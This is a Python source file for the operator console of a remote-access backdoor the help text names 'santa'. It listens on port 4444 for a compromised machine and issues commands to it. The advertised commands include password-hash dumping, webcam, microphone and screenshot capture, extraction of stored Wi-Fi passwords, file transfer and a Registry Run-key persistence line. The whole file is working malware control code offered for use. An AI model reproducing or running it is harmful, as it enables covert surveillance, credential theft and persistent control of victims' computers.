import socket
import pickle
import colorama
from colorama import Fore, Back
import subprocess
import base64
import os
import readline
subprocess.call('clear', shell=True)
colorama.init(autoreset=True)
IP = '192.168.0.103'
PORT = 4444
format = 'utf-8'
BUFFER = 1024 * 128

#available_devices = []
#print(available_devices)
#choice = input('Target: ')

class MyCompleter(object):
    def __init__(self, options):
        self.options = sorted(options)
    def complete(self, text, state):
        if state == 0:
            if text:
                self.matches = [s for s in self.options
                                    if s and s.startswith(text)]
            else:
                self.matches = self.options[:]
        try:
            return self.matches[state]
        except IndexError:
            return None
# commands list
completer = MyCompleter(["?", "/", "/?", "help"])
readline.set_completer(completer.complete)
readline.parse_and_bind('tab: complete')

def establish_connection():
    global listener
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((IP, PORT))
    listener.listen(0)
establish_connection()
print(Fore.WHITE + "-" * 118)
print(Fore.CYAN + "[i] Waiting for incoming connections ..." + Fore.RED + f"\t\t\t\t\t[-] Port {PORT} is openned")
print(Fore.WHITE + "-"*118)
def keep_connection():
    global connection, address
    connection, address = listener.accept()
try:
    connection, address = listener.accept()
except:
    keep_connection()
print()
print(Fore.GREEN + "[+] Got a connection from " + Fore.YELLOW + str(address[0]) + Fore.GREEN + ':' + Fore.YELLOW + str(address[1])) 
print()
def sendBox(data):
    global connection
   # pickle_data = pickle.dumps(data)
   # connection.send(pickle_data)
   # print(f'sending > "{data}", {type(data)}')  # save the commands into a database to make cmd history
    msg_ = str(data)
    msg_ = msg_.encode(format)
    try:
        connection.send(msg_)
    except:
        print(Fore.RED + '\n[-] Connection lost\n' + Fore.CYAN + '[i] Reconnecting to: ' + str(address[0]))
        establish_connection()
        keep_connection()
        print(Fore.GREEN + '[+] Reconnected\n')
        enter_cmd()

def receiveBox():
    global BUFFER
    try:
        msg = connection.recv(BUFFER)
        msg = msg.decode(format)
        return msg
    except:
        enter_cmd()

def exec_remotely(command):
    global connection
    if command[0] != 'clear':
        sendBox(command)
    if command[0] == '!quit':
        subprocess.call('clear', shell=True)
        connection.close()
        print(Fore.WHITE + "-"*118)
        print(Fore.RED + '[-] Quit' + Fore.CYAN + '\t\t\t\t\t\t\t\t\t[i] Port 4444 is now closed')
        print(Fore.WHITE + "-"*118 + "\n")
        exit()
    elif command[0] == 'recon' or command[0] == 'r' or command[0] == 'reconnect':
        print("\n")
        print(Fore.CYAN + '[i] Reconnecting to ' + Fore.RED +  f'{user}' + Fore.CYAN + ' at ' + Fore.RED + f'{address}') 
        print("\n")
        establish_connection()
        keep_connection()
        enter_cmd()
    return receiveBox()

def write_file(path, content):  # download
    with open(path, 'wb') as file:
        #content = bytes(content, format)
        file.write(base64.b64decode(content))
        CWD1 = os.getcwd()
        return(Fore.GREEN + f"\n[+] Download Successful\n" + Fore.CYAN + f"[i] File saved in - {CWD1}\n")

def read_file(path):  # upload
    try:
        with open (path, 'rb') as file:
            return base64.b64encode(file.read())
    except FileNotFoundError:
        print(Fore.RED + '\n[-] File not found\n' + Fore.CYAN + f'[i] This file does not exist on you machine\n')

command = ['whoami']
user = exec_remotely(command)
user = user.strip()

try:
    command = ['os']
    platform = exec_remotely(command).strip()
except:
    platform = 'unknown'

console_color = "WHITE"

def enter_cmd():
    global user, platform, console_color
    completer = MyCompleter(["?", "bcap", "browse", "browsers", "cam", "cam_list", "clear", "connect", "decrypt", "defoff", "dget", "du", "download", "encrypt", "exec", "expl", "getuid", "hashdump", "help", "idletime", "interact", "jsi", "mic", "msg","nwi", "pc", "prs", "pss", "pysh", "rec", "run", "search", "shell", "src", "srq", "startup", "sysinfo", "syspower", "time", "timeinfo", "upload", "use", "version", "web_cam", "webcam_list", "wifips"])
    readline.set_completer(completer.complete)
    readline.parse_and_bind('tab: complete')
    while True:
        try:
            if console_color == "WHITE":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.WHITE + " > ")
            elif console_color == "DEFAULT":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.RESET + " > ")
            elif console_color == "BLUE":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.BLUE + " > ")
            elif console_color == "GREEN":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.GREEN + " > ")
            elif console_color == "LIGHTBLUE":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.LIGHTBLUE_EX + " > ")
            elif console_color == "LIGHTCYAN":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.LIGHTCYAN_EX + " > ")
            elif console_color == "LIGHTGREEN":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.LIGHTGREEN_EX + " > ")
            elif console_color == "LIGHTMAGENTA":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.LIGHTMAGENTA_EX + " > ")
            elif console_color == "LIGHTRED":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.LIGHTRED_EX + " > ")
            elif console_color == "LIGHTWHITE":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.LIGHTWHITE_EX + " > ")
            elif console_color == "LIGHTYELLOW":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.LIGHTYELLOW_EX + " > ")
            elif console_color == "LIGHTBLACK":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.LIGHTBLACK_EX + " > ")
            elif console_color == "RED":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.RED + " > ")
            elif console_color == "BLACK":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.BLACK + " > ")
            elif console_color == "MAGENTA":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.MAGENTA + " > ")
            elif console_color == "YELLOW":
                command = input(Fore.RED + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.YELLOW + " > ")
            else:
                command = input(Fore.WHITE + f"{user}" + Fore.LIGHTBLUE_EX + f"({platform})" + Fore.RED + " > ")
        except KeyboardInterrupt:
            try:
                print(Fore.CYAN + '\t\t\t\t\t\t[i] Press ^C again to quit')
                command = input(Fore.RED + f"\n{user}" + Fore.WHITE + " > ")
            except:
                print("\n\n" + Fore.WHITE + "-"*118)
                print(Fore.RED + '[-] Quit' + Fore.CYAN + '\t\t\t\t\t\t\t\t\t[i] Port 4444 is now closed')
                print(Fore.WHITE + "-"*118 + "\n")
                exit()
        try:
            command = command.split(" ")
        except:
            print(Fore.RED + '\n[-] Error occurred\n')
        if command[0] == "clear":
            subprocess.call('clear', shell=True)
            print(Fore.WHITE + "-"*118 + '\n')
            enter_cmd()
        elif command[0] == "":
            enter_cmd()
        elif command[0] == "time":
            from datetime import datetime
            now = datetime.now()
            server_current_time = now.strftime("%H:%M:%S.%f")
            print('\n' + Fore.LIGHTGREEN_EX + f'[@] Server: {server_current_time}')
        elif command[0] == "help":
            try:
                if command[1]:
                    if command[1] == '?':
                        help_ = """Command "?" displays the help menu\nYou can choose from 6 pages\n"?" refers to the first page\n"?2" refers to the second page\n"?3" refers to the third page"""
                    elif command[1] == 'bcap':
                        help_ = """Command "bcap" displays:\nThe battery in percentages\nSeconds remaining\nIf the device is plugged or not\n\nbcap works only for laptops\n"""
                    elif command[1] == 'browse':
                        help_ = """Command "browse" opens a browser on the client\nThe "browse" command takes two arguments\nbrowse <browser> <url>\nThe first argument can be anything, however it must be specified. E.g: "browse d" will open a browser with already\nspecified URL\nThe first argument "d" has no meaning and it refers to "default browser", "d" can also be "asdf" or \n"random_characters" because this module supports only the customized browser.\nTo change the URL just add a second argument - "browse d https://netbeltfinance.com"\n"browse" with no arguments will also be executed on the client - (argument1=custom browser; argument2=specified url in the backdoor)"""
                    elif command[1] == 'browsers':
                        pass
                    elif command[1] == 'cam':
                        pass
                    elif command[1] == 'cam_list':
                        pass
                    elif command[1] == 'clear':
                        help_ = """Command "clear" clears the screen on the local machine\nIt takes no arguments\n"""
                    elif command[1] == 'connect':
                        pass
                    elif command[1] == 'crs':
                        pass
                    elif command[1] == 'decrypt':
                        pass
                    elif command[1] == 'defoff':
                        pass
                    elif command[1] == 'dget':
                        help_ = """Command "dget" downloads a file from the Internet\nThe command takes two arguments - URL and FILENAME\ndget <URL> <FILENAME>\ndget saves the file in the current working directory with the specified filename\n"""
                    elif command[1] == 'download':
                        pass
                    elif command[1] == 'du':
                        help_ = """Command "du" displays Disk information:\nPartitions, usage, file system type, total size, used, free, percetange, total read, total write\n\nThis command takes no arguments\n"""
                    elif command[1] == 'encrypt':
                        pass
                    elif command[1] == 'exec':
                        pass
                    elif command[1] == 'expl':
                        pass
                    elif command[1] == 'getuid':
                        help_ = """Command "getuid" will display the user that the backdoor is running on"""
                    elif command[1] == 'hashdump':
                        pass
                    elif command[1] == 'help':
                        help_ = """Command "help" displays the help menu\nThe command takes one argument\nhelp <command>\n"""
                    elif command[1] == 'idletime':
                        help_ = """Command "idletime" displays the user that the backdoor is running\nThis command takes no arguments"""
                    elif command[1] == 'interact':
                        help_ = """Command "interact" changes the suggested words for shell autocompletion\n\nThis command takes three arguments\ninteract <operating system> <version> <verbose>\n\nAvailable operating systems: Windows, Linux\nVersions:\nWindows\t10\n7\n\nVerbose can be set to True or False\n When it is set to True the shell autocompletion commands will be longer.\nIf the verbose was not specified or set to something different than True or False it automatically sets to False."""
                    elif command[1] == 'jsi':
                        pass
                    elif command[1] == 'mic':
                        pass
                    elif command[1] == 'msg':
                        pass
                    elif command[1] == 'nwi':
                        help_ = """Command "nwi" displays network information:\nInterface, local IP address, Netmask, Broadcast IP\nThis command takes no arguments"""
                    elif command[1] == 'pc':
                        pass
                    elif command[1] == 'prs':
                        pass
                    elif command[1] == 'pss':
                        help_ = """Command "pss" displays the current running processes\n\nThis command takes no arguments"""
                    elif command[1] == 'pysh':
                        pass
                    elif command[1] == 'rec':
                        pass
                    elif command[1] == 'run':
                        pass
                    elif command[1] == 'search':
                        pass
                    elif command[1] == 'shell':
                        pass
                    elif command[1] == 'src':
                        help_ = """Command "src" takes a screenshot\n\n"src .."\nTakes a screenshot in the parent directory of the current working directory.\n\n"src FOLDER"\nTakes a screenshot in the specified folder.\n\n"src "FOLDER NAME WITH SPACES""\nTakes a screenshot in the specified folder. Use this when the folder name contains spaces.\n\n"src"\nTakes a screenshot in the current working directory."""
                    elif command[1] == 'srq':
                        pass
                    elif command[1] == 'startup':
                        pass
                    elif command[1] == 'sysinfo':
                        help_ = """Command "sysinfo" displays:\nOperating system, release, version, core, architecture, hostname, public IP address, location, MAC address, processor information\n"""
                    elif command[1] == 'syspower':
                        help_ = """Command "syspower" diplays CPU and RAM information:\n\nCPU:\nPhysical cores, total cores, min frequency, current frequency, CPU usage per core, total CPU usage\n\nMemory information:\nTotal RAM, available RAM, RAM usage, SWAP Memory total RAM, SWAP free RAM, SWAP used RAM, RAM usage"""
                    elif command[1] == 'time':
                        help_ = "no documentation"
                    elif command[1] == 'timeinfo':
                        help_ = """Command "time" displays:\nBoot time (When the targetted device boot up)\nCurrent time (The current time on the targetted device)\nTime used (Numbers of hours that the device have been used)"""
                    elif command[1] == 'upload':
                        pass
                    elif command[1] == 'use':
                        pass
                    elif command[1] == 'version':
                        help_ = """Command "version" shows the framework and console library version names and numbers\n\nVersion: "santa v1.0.0 catbird seat" is the most powerful backdoor\nVersion: "santamini v1.0.0 no dominance" is a backdoor with less functionalities\n"""
                    elif command[1] == 'web_cam':
                        pass
                    elif command[1] == 'webcam_list':
                        help_ = """Command "webcam_list" displays the available cameras on the targetted device\nIt takes no arguments"""
                    elif command[1] == 'wifips':
                        help_ = """Command "wifips" displays all the Wi-Fi passwords stored on the targetted device\nThis command works only on Windows and Linux\nIt takes no arguments"""
                    elif command[1] == '':
                        pass
                    elif command[1] == '':
                        pass



                    else:
                        help_ = Fore.RED + f'The command "{command[1]}" does not exist' 
                    print(help_)
            except IndexError:
                pass
        elif command[0] == "download":
            result = exec_remotely(command)
            try:
                result = write_file(command[1], result)
            except:
                print(Fore.CYAN + '\n[i] Tip: "download <filename>"')
            print(result)
        elif command[0] == "upload" and len(command) == 2:
            try:
                file_content = read_file(command[1])
                command.append(file_content)
            except IndexError:
                print(Fore.RED + '\n[-] Error occurred\n' + Fore.CYAN + '[i] Tip: upload <filename>\n' + Fore.LIGHTGREEN_EX + '[@] Help: "help upload"')
       
        elif command[0] == "interact":
            def interact(os, version, verbose):
                if os == 'WINDOWS' and version == '10':
                    completer = MyCompleter(["arp -a", "change", "clip", "del", "dir", "getmac", "ipconfig", "logoff", "move", "net view", "netsh wlan show profile", "netsh wlan show profile <NETWORK> key=clear", "netstat", "openfiles", "ping", 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v <FILE_NAME> /t REG_SZ /d "c:\\LOCATION_FILE.exe"', "rmdir", "shutdown /l", "shutdown /r", "shutdown /s", "systeminfo", "tasklist", "ver", "where", "whoami", "wmic csproduct get vendor, version", "wmic product get name", "wmic startup get caption,command"])
                    readline.set_completer(completer.complete)
                    readline.parse_and_bind('tab: complete')
                elif os == 'LINUX':
                    completer = MyCompleter(["whoami"])
                    readline.set_completer(completer.complete)
                    readline.parse_and_bind('tab: complete')
            try: interact(command[1].upper(), command[2].upper(), command[3])
            except:
                Error_MSG = '[-] Error occurred'
                Error_INFO = '[i] Help: interact <operating system¦default=all> <version¦default=None> <verbose=True/False¦default=True>'
                quick_tip = '[*] Tip: use "help" for help or "help <command>"'
                print(Fore.RED + f'\n{Error_MSG}' + Fore.CYAN + f'\n{Error_INFO}\n' + Fore.LIGHTMAGENTA_EX + f'{quick_tip}')
        elif command[0] == "shell":
            if platform[0:-3] == Fore.LIGHTBLUE_EX + 'Windows':
                print('exec')
            else:
                print(platform)
        elif command[0] == "color":
            try:
                console_color = command[1].upper()
            except:
                print(Fore.RED + '\n[-] Error occurred\n' + Fore.CYAN + '[i] Tip: specify an argument\n' + Fore.LIGHTGREEN_EX + '[@] Help: use "help color"')
        custom_commands = [
            'a'

        ]
        if command[0] in custom_commands:
            custom_cmd = True
        else:
            custom_cmd = False

        if command[0] != 'download' and command[0] != 'upload' and command[0] != 'clear' and custom_cmd != True:
            result = exec_remotely(command)
        else:
            result = exec_remotely(command)

        if command[0] != "clear" and command[0] != "download":
            print(Fore.YELLOW + result)
        else:
            if command[0] != "download":
                print(Fore.WHITE + "-"*118 + '\n')
enter_cmd()
